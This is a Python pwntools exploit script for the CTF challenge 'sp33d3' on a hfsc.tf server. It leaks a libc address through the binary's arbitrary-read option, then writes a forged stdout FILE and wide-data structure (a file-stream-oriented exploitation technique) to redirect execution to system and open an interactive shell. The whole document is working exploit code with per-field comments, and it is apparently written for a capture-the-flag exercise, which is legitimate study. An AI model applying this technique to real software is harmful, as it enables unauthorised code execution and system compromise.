#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './sp33d3_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'sp33d.play.hfsc.tf', 16522

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# ─╼ [★]$ file sp33d3
# sp33d3: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fecf2618d8c09d36ad990334cf78d832ca313efa, for GNU/Linux 3.2.0, not stripped
# └──╼ [★]$ pwn checksec sp33d3
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     FORTIFY:  Enabled

def malloc(size) -> int:
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b':', str(size).encode())  
    return int(io.recvline().strip(), 16)

def free(addr):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b':', hex(addr).encode())  

def arb_read(addr, count):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', hex(addr).encode())  
    io.sendlineafter(b':', str(count).encode())

def arb_write(addr, data):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b':', hex(addr).encode())  
    io.sendlineafter(b':', str(len(data)).encode())
    io.send(data)

def exploit():
    global io
    io = initialize()

    chunk1 = malloc(0x420)
    chunk2 = malloc(0x10)
    free(chunk1)

    arb_read(chunk1, 0x8)
    io.recv(5)
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x203b20

    fp = libc.sym["_IO_2_1_stdout_"]
    overlap = b'  sh\x00\x00\x00\x00' # [FILE] _flags | [WIDE DATA] read_ptr
    overlap += flat([
        p64(0x0),               # [WIDE DATA] read_end
        p64(0x0),               # [WIDE DATA] read_base
        p64(0x0),               # [WIDE DATA] write_base
        p64(0x0),               # [WIDE DATA] write_ptr
        p64(0x0),               # [WIDE DATA] write_end
        p64(0x0),               # [WIDE DATA] buf_base
        p64(0x0),               # [WIDE DATA] buf_end 
        p64(0x0),               # [WIDE DATA] save_base
        p64(0x0),               # [WIDE DATA] backup_base 
        p64(0x0),               # [WIDE DATA] save_end
    ])
    overlap += b'\x00' * 8       # [WIDE DATA] state
    overlap += b'\x00' * 8       # [WIDE DATA] last_state

    codecvt = b''
    codecvt += p64(libc.sym['system'])     # [FILE] _chain | [WIDE DATA] codecvt | [VTABLE] __doallocate (at function authenticate, skips the puts because we overwrote stdout)
    codecvt += b'\x00' * 0x18                   # padding
    codecvt += p64(fp - 0x10)                   # [FILE] _lock
    codecvt += p64(0x0) * 2                     # padding
    codecvt += p64(fp+0x8)                      # [FILE] _wide_data
    codecvt += b'\x00' * (0x18 + 4 + 20)        # padding
    codecvt += p64(libc.sym['_IO_wfile_jumps']) # [FILE] vtable
    codecvt += b'\x00' * (0x70 - len(codecvt))  # padding
    
    overlap += codecvt
    overlap += p64(0x0)                         # [WIDE DATA] wchar_t shortbuf[1] (alligned to 8 bytes)
    overlap += p64(fp)                          # [WIDE DATA] vtable

    arb_write(fp, overlap)

    log.info('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
